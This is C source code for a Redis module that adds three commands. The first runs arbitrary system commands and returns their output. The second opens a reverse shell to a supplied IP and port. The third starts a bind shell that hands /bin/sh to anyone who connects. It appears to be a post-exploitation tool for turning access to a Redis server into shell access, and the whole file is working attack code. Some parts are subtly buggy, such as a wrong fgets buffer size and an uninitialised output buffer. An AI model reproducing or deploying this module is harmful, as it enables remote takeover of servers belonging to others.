#include "redismodule.h"

#include <stdio.h> 
#include <string.h> 
#include <unistd.h>  
#include <stdlib.h> 
#include <errno.h>   
#include <sys/wait.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>



/*
* sys.exec <cmd>
*/

int ExecuteCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {

  // we must have only 1 arg: CMD
  if (argc != 2) {
    // Wrong number of args
    return RedisModule_WrongArity(ctx);
  }
  // Opting for auto memory management
  RedisModule_AutoMemory(ctx);

  size_t size = 1024;

  // Get command and its length
  size_t cmd_len;
  char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);

  // argv[1] - Contains the command to be executed
  FILE *fp = popen(cmd, "r");

  char *buf, *output;
  buf = (char *)malloc(size);
  output = (char *)malloc(size);

  while (fgets(buf, sizeof(buf), fp) != 0) {
    if (strlen(buf) + strlen(output) >= size) {
      output = realloc(output, size<<2);
      size <<= 1;
    }
    strcat(output, buf);
  }

  pclose(fp);

  RedisModuleString *ret = RedisModule_CreateString(ctx, output, strlen(output));
  RedisModule_ReplyWithString(ctx, ret);

  return REDISMODULE_OK;
}



/*
* sys.revshell <ip> <rport>
*/
int ReverseShell(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {

  // we need EXACTLY 2 arguments: IP and Port
  if (argc != 3) {
    return RedisModule_WrongArity(ctx);
  }

  RedisModule_AutoMemory(ctx);

  size_t cmd_len;
  char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
  char *rport = RedisModule_StringPtrLen(argv[2], &cmd_len);
  int port = atoi(rport);
  int sockfd;

  struct sockaddr_in sa;
  sa.sin_family = AF_INET;
  sa.sin_addr.s_addr = inet_addr(ip);
  sa.sin_port = htons(port);
  
  sockfd = socket(AF_INET, SOCK_STREAM, 0);
  connect(sockfd, (struct sockaddr *)&sa, sizeof(sa));

  dup2(sockfd, 0);
  dup2(sockfd, 1);
  dup2(sockfd, 2);

  pid_t child_pid = fork();

  if (child_pid == 0) {
    execve("/bin/sh", 0, 0);
  }
  else if (child_pid > 0) {
    waitpid(-1, NULL, WNOHANG);
  }

  return REDISMODULE_OK;
}



/*
* sys.bindshell <ip> <lport>
*/
int BindShell(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {

  // we need EXACTLY 2 arguments: IP and Port
  if (argc != 3) {
    return RedisModule_WrongArity(ctx);
  }

  RedisModule_AutoMemory(ctx);

  size_t cmd_len;
  char *ip = RedisModule_StringPtrLen(argv[1], &cmd_len);
  char *lport = RedisModule_StringPtrLen(argv[2], &cmd_len);
  int port = atoi(lport);

  int server_sockfd, client_sockfd;

  struct sockaddr_in sa, client_sa;
  sa.sin_family = AF_INET;
  sa.sin_addr.s_addr = inet_addr(ip);
  sa.sin_port = htons(port);

  server_sockfd = socket(AF_INET, SOCK_STREAM, 0);
  bind(server_sockfd, (struct sockaddr *) &sa, sizeof(sa));
  listen(server_sockfd, 1);

  int client_addr_len;

  char msg[1024];

  for(;;) {
    client_addr_len = sizeof(client_sa);
    client_sockfd = accept(server_sockfd, (struct sockaddr *)&client_sa, (socklen_t *)&client_addr_len);

    if(client_sockfd < 0) {
      perror("[ERROR] accept() failed!");
      return -1;
    }

    pid_t child_pid = fork();

    if(child_pid == 0) {
      // Child
      close(server_sockfd);
      write(client_sockfd, msg, strlen(msg));

      dup2(client_sockfd, 2);
      dup2(client_sockfd, 1);
      dup2(client_sockfd, 0);

      execve("/bin/sh", 0, 0);
    }
    else if (child_pid < 0) {
      perror("[ERROR[ fork() failed!");
    }
    else {
      // Parent
      if (waitpid(child_pid, NULL, 0) < 0) {
        perror("Failed to collect child process");
      }
      close(client_sockfd);
    }
  }

  return REDISMODULE_OK;

}



int RedisModule_OnLoad(RedisModuleCtx *ctx) {

  // Register the module itself
  if (RedisModule_Init(ctx, "sys", 1, REDISMODULE_APIVER_1) == REDISMODULE_ERR) {
    return REDISMODULE_ERR;
  }

  // register example.parse - the default registration syntax
  if (RedisModule_CreateCommand(ctx, "sys.exec", ExecuteCommand, "readonly",
                                1, 1, 1) == REDISMODULE_ERR) {
    return REDISMODULE_ERR;
  }

  // register example.parse - the default registration syntax
  if (RedisModule_CreateCommand(ctx, "sys.revshell", ReverseShell, "readonly",
                                1, 1, 1) == REDISMODULE_ERR) {
    return REDISMODULE_ERR;
  }

  // register example.parse - the default registration syntax
  if (RedisModule_CreateCommand(ctx, "sys.bindshell", BindShell, "readonly",
                                1, 1, 1) == REDISMODULE_ERR) {
    return REDISMODULE_ERR;
  }

  return REDISMODULE_OK;
}